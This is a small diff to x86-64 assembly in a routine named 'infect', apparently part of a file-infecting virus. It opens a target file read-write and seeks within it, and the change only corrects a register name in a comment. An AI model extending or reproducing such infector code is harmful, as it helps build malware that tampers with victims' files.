@@ -41,7 +41,7 @@ infect:
 	mov rdi, r10 ; PATHNAME
 	mov rsi, 2 ; O_RDWR
 	syscall
-	mov r9, rax ; KEEP OUR FD IN R11 REG
+	mov r9, rax ; KEEP OUR FD IN R9 REG
 
 	mov rdi, rax
 	mov rax, 8 ; LSEEK KERNEL CODE
